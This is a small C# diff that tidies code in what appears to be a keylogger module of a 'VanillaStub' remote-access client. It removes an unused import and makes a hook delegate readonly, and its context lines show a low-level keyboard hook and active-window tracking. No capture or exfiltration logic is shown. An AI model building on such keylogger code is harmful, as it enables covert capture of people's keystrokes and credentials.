@@ -4,7 +4,6 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
-using System.Windows.Forms.VisualStyles;
 
 namespace VanillaStub.Helpers.Services
 {
@@ -14,7 +13,7 @@ namespace VanillaStub.Helpers.Services
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc Proc = HookCallback;
+        private static readonly LowLevelKeyboardProc Proc = HookCallback;
         private static IntPtr HookID = IntPtr.Zero;
         private static string CurrentWindow = "";
         public static bool SendKeys { private get; set; }
